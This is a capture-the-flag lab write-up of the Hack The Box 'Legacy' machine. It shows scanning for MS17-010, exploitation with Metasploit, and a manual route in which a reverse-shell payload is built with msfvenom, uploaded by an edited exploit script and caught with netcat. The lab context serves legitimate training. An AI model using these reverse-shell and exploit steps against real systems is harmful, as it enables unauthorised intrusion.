# Legacy
https://app.hackthebox.com/machines/Legacy

![Legacy](images/htb-legacy.png)

Target IP
10.10.10.4

## Enumeration
---

First lets start with [AutoRecon](https://github.com/Tib3rius/AutoRecon).
```
sudo $(which autorecon) 10.10.10.4
```

### Nmap

Nmap results, returned from AutoRecon, show the following ports open.

```
PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds
123/udp  open          ntp          udp-response ttl 127 Microsoft NTP
| ntp-info: 
|_  receive time stamp: 2022-10-21T03:59:29
137/udp  open          netbios-ns   udp-response ttl 127 Microsoft Windows netbios-ns (workgroup: HTB)
| nbns-interfaces: 
|   hostname: LEGACY
|   interfaces: 
|_    10.10.10.4
```

A deeper investigation on the open the main ports, shows that the target may be vulnerable to `MS08-067` and `MS17-010`.

```
$ sudo nmap -p 139,445 --script vuln 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-15 23:15 PDT
Nmap scan report for 10.10.10.4
Host is up (0.077s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 25.38 seconds
```

## Exploitation
---

### Metasploit Framework

Lets start with `Meterpreter` ...

```
$ msfconsole
```

... and search for `ms17-010`

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

After testing a few of the exploits, the `ms17_010_psexec` worked. Let me show the steps.

```
msf6 > use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Checking the options we see the following.

```
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                 Required  Description
   ----                  ---------------                 --------  -----------
   DBGTRACE              false                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                              yes       How many times to try to leak transaction
   NAMEDPIPE                                             no        A named pipe that can be connected to (leave blank for
                                                                    auto)
   NAMED_PIPES           /usr/share/metasploit-framewor  yes       List of named pipes to check
                         k/data/wordlists/named_pipes.t
                         xt
   RHOSTS                                                yes       The target host(s), see https://github.com/rapid7/meta
                                                                   sploit-framework/wiki/Using-Metasploit
   RPORT                 445                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                   no        Service description to to be used on target for pretty
                                                                    listing
   SERVICE_DISPLAY_NAME                                  no        The service display name
   SERVICE_NAME                                          no        The service name
   SHARE                 ADMIN$                          yes       The share to connect to, can be an admin share (ADMIN$
                                                                   ,C$,...) or a normal read/write folder share
   SMBDomain             .                               no        The Windows domain to use for authentication
   SMBPass                                               no        The password for the specified username
   SMBUser                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.24.159.33    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

We need to set `LHOST` and  `RHOSTS`.

```
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
```


Now the options seem to be good.

```
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                 Required  Description
   ----                  ---------------                 --------  -----------
   DBGTRACE              false                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                              yes       How many times to try to leak transaction
   NAMEDPIPE                                             no        A named pipe that can be connected to (leave blank for
                                                                    auto)
   NAMED_PIPES           /usr/share/metasploit-framewor  yes       List of named pipes to check
                         k/data/wordlists/named_pipes.t
                         xt
   RHOSTS                10.10.10.4                      yes       The target host(s), see https://github.com/rapid7/meta
                                                                   sploit-framework/wiki/Using-Metasploit
   RPORT                 445                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                   no        Service description to to be used on target for pretty
                                                                    listing
   SERVICE_DISPLAY_NAME                                  no        The service display name
   SERVICE_NAME                                          no        The service name
   SHARE                 ADMIN$                          yes       The share to connect to, can be an admin share (ADMIN$
                                                                   ,C$,...) or a normal read/write folder share
   SMBDomain             .                               no        The Windows domain to use for authentication
   SMBPass                                               no        The password for the specified username
   SMBUser                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Let's check if all is ok.

```
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.4:445 - The target is vulnerable.
```


We got a shell.

```
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x8606a668
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... GGqlLhpO.exe
[*] 10.10.10.4:445 - Created \GGqlLhpO.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \GGqlLhpO.exe...
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1032) at 2022-10-15 21:07:50 -0700

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Manually

There are many scripts around to exploit MS17-010. However, most of them only run on python2.7. After some search, I found the following GitHub repo with an adaptation for python3.

[Python3 MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

Basically we need 2 files from the repo:
- mysmb.py
- zzz_exploit.py

But the easiest step is to clone the whole repo.

```
$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

We will need to send to the target a shell code. Let's use `msfvenom` to generate it.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o ms17-010.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: ms17-010.exe
```

We will edit the `zzz_exploit.py` file to include some instructions to upload our payload to the target.

```
...
def do_system_mysmb_session(conn, pipe_name, share, mode):
    #stringbinding = 'ncacn_np:10.11.1.75[\pipe\svcctl]'

    # <<<<<>>>>>
    # manually adding file upload 
    smbConn = conn.get_smbconnection()
    print('Sending file ms17-010.exe to the target...')
    smb_send_file(smbConn, '/home/kali/Desktop/HTB/Legacy/ms17-010.exe', 'C', '/ms17-010.exe')
    print('done.')
    # <<<<<>>>>>

    print("[*] have fun with the system smb session!")
...
```

Lets start our listner.

```
$ nc -nlvp 4444
listening on [any] 4444 ...
```

When executing our script, it will upload our file and open a fragile shell on the target. But as soon as we run our payload, it will connect to our listner and we will have a more consistent shell.

```
$ python zzz_exploit.py 10.10.10.4                      
[*] Target OS: Windows 5.1
[+] Found pipe 'browser'
[+] Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x863fdda8
SESSION: 0xe1101130
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[+] current TOKEN addr: 0xe23e0600
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe23e06a0
[*] overwriting token UserAndGroups
Sending file ms17-010.exe to the target...
done.
[*] have fun with the system smb session! :-)
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\WINDOWS\system32>cmd /c C:\ms17-010.exe
```

```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.4] 1038
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## Links

[0xdf walkthrough](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)